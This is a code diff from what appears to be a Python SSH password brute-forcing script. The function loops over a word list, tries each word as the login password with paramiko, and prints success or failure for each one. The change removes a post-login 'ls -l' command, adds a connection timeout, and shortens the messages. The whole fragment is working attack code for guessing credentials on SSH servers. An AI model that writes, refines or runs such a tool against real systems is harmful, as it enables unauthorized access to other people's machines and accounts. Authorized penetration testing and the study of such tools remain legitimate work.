@@ -31,23 +31,13 @@ def connection(words):
             break
         try:
             password = words[i]
-            client.connect(hostname, username=username, password=password)
-            stdin, stdout, stderr = client.exec_command('ls -l')
-            output = stdout.read().decode('utf-8')
-            error = stderr.read().decode('utf-8')
-            if output:
-                print("Command Output:")
-                print(output)
-                print(f"Successful Login: {password}")
-            if error:
-                print("Command Error:")
-                print(error)
+            client.connect(hostname, username=username, password=password, timeout=5)
+            print(f"Success: {password}")
         except paramiko.AuthenticationException:
-            print("Authentication failed.")
-        except paramiko.SSHException as e:
-            print(f"SSH connection error: {e}")
+            print(f"Fail: {password}")
         except Exception as e:
-            print(f"An unexpected error occurred: {e}")
+            print(f"[!] Error: {e}")
+            print(f"Fail: {password}")
         finally:
             client.close()
         i += 1
